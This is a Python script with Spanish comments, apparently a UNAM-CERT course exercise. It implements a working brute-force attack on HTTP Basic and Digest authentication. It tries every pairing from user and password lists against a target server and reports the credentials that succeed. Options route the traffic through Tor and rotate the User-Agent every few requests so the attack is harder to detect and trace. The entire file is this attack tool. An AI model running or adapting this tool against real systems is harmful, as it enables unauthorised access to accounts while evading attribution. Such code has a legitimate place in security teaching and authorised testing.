#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
#Cerón Rodríguez Lezly Dialid

# Previamente instalar requests con pip si es necesario

import optparse
import sys
import re
import requests
from requests import get
from requests.exceptions import ConnectionError
from requests.auth import HTTPDigestAuth

#Para leer argumentos ingresados al ejecutar el programa
def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=False, action='store_true', help='Imprime información detallada durante la ejecución')
    parser.add_option('-p','--port', dest='port', default='80', help='Puerto de escucha de HTTP')
    parser.add_option('-s','--server', dest='server', default=None, help='Host que será atacado')
    parser.add_option('-r','--report', dest='report', default=None, help='Archivo donde los resultados serán reportados. En combinación con -o también se mandan a salida estándar. Si no está espeificado los resultados se mandan a salida estándar.')
    parser.add_option('-o','--std-out', dest='stdout', default=False, action='store_true', help='Los resultados se mandan a salida estándar. Opción por default.')
    parser.add_option('-u', '--user', dest='user', default=None, help='Usuario que será probado durante el ataque')
    parser.add_option('-w', '--password', dest='password', default=None, help='Contraseña que será probada durante el ataque')
    parser.add_option('-U', '--user-list', dest='user_list', default=None, help='Lista de usuarios que serán probados durante el ataque')
    parser.add_option('-W', '--password-list', dest='password_list', default=None, help='Lista de contraseñas que será probadas durante el ataque')
    parser.add_option('-t','--tls', dest='tls', default=False, action='store_true', help='Para usar HTTPS en vez de HTTP')
    parser.add_option('-d','--digest', dest='digest', default=False, action='store_true', help='Para usar autenticación digest en vez de autenticación basic')
    parser.add_option('-T','--tor', dest='tor', default=False, action='store_true', help='Para hacer las peticiones a través de TOR.')
    parser.add_option('-a','--change-user-agent', type="int", dest='useragent', default=5, help='Número de peticiones después de las cuales se cambiará el agente')
    opts, args = parser.parse_args()
    return opts

#Para revisar si hay errores en las opciones recibidas. 
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if not options.password and not options.password_list:
        printError('Especificar una contraseña o una lista de contraseñas a probar.', True)
    if not options.user and not options.user_list:
        printError('Especificar un usuario o una lista de usuarios a probar.', True)
    if options.password and options.password_list:
        printError('Especificar solamente una contraseña o una lista de contraseñas.', True)
    if options.user and options.user_list:
        printError('Especificar solamente un usuario o una lista de usuarios.', True)
    if options.useragent <= 0:
        printError('Especificar un entero mayor a cero para el número de requests tras el cual se cambia el agente de usuario.', True)

#Imprime un mensaje en salida de errores, termina el programa si se le indica
def printError(msg, exit = False):
    sys.stderr.write('Error:\t%s\n' % msg)
    if exit:
        sys.exit(1)

# User agents más comunes.
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
]

#Realiza el reporte con los resultados obtenidos y los imprime en salida estándar o ambos.
def reportResults(resultados, archivo, stdout):
    if not archivo or (archivo and stdout):
        print(resultados)
    if archivo:
        with open(archivo, "w") as f:
            f.write(resultados)

#Regresa una cadena de url con ip, puerto y protocolos
def buildURL(server, port, protocol='http', tls=False):
    if opts.tls:
        protocol = 'https'
    url = '%s://%s:%s' % (protocol, server, port)
    return url

#Para realizar peticiones HTTP al host especificado. Retorna true si se pudo autenticar a user con password. Sólo si tor_session es true se realiza la petición a través de TOR
def makeRequest(host, user, password, verboso, digest, user_agent, tor_session):
    try:
        headers = {'User-Agent': user_agent}
        auth = HTTPDigestAuth(user, password) if digest else (user, password)
        response = None
        if tor_session is None:
            response = get(host, auth=auth, headers=headers)
        else:
            response = tor_session.get(host, auth=auth, headers=headers)
        if verboso:
            print("Agente de usuario: %s" % user_agent)
            print("Usuario: %s, Contraseña: %s, Respuesta: %s" % (user, password, str(response)))
        if response.status_code == 200:
            return True
    except ConnectionError:
        printError('Error en la conexión, probablemente el servidor no esté levantado.',True)
    return False

#Regresa una lista con las palabras del archivo recibido. Maneja la excepción IOError.
def lista_archivo(archivo):
    try:
        f = open(archivo)
        l = f.readlines()
        f.close()
    except IOError:
        printError('No se puede abrir el archivo %s.' % archivo, True)
    return [x[:-1] for x in l]

#Regresa una lista de cadenas a partir de la lista pass_user o del archivo pass_user_list
def get_pass_users(pass_user, pass_user_list):
    if pass_user:
        return [pass_user]
    return lista_archivo(pass_user_list)

#Regresa una sesión de TOR
def get_tor_session():
    session = requests.session()
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

#Condiciones de ejecución
if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port=opts.port, tls=opts.tls)
        usuarios = get_pass_users(opts.user, opts.user_list)
        passwords = get_pass_users(opts.password, opts.password_list)
        tipo = "Digest" if opts.digest else "Basic"
        tor_session = None
        iprexp = r"(?:[0-9]{1,3}\.){3}[0-9]{1,3}"
        if opts.tor:
            tor_session = get_tor_session()
        ip_origen = tor_session.get("http://httpbin.org/ip").text if opts.tor else get("http://httpbin.org/ip").text
        ip_origen = re.findall(iprexp, ip_origen)[0]
        s = ["URL destino: %s" % url,
             "Tipo de autenticación: %s" % tipo,
             "Usando conexión a través de TOR: %s" % opts.tor,
             "Dirección IP origen: %s" % str(ip_origen)
        ]
        if opts.verbose:
            print("\n".join(s))
        ua = 0
        i = 1
        for u in usuarios:
            for p in passwords:
                if i % opts.useragent == 0:
                    ua = (ua + 1) % len(user_agents)
                i += 1
                if makeRequest(url, u, p, opts.verbose, opts.digest, user_agents[ua], tor_session):
                    s.append('¡CREDENCIALES ENCONTRADAS!: %s\t%s' % (u,p))
                    if opts.verbose:
                        print(s[-1])
        if len(s) == 4:
            s.append("Ningún usuario y contraseña coincidió" )
        reportResults('\n'.join(s), opts.report, opts.stdout)
    except Exception as e:
        printError('Ocurrió un error inesperado')
        printError(e, True)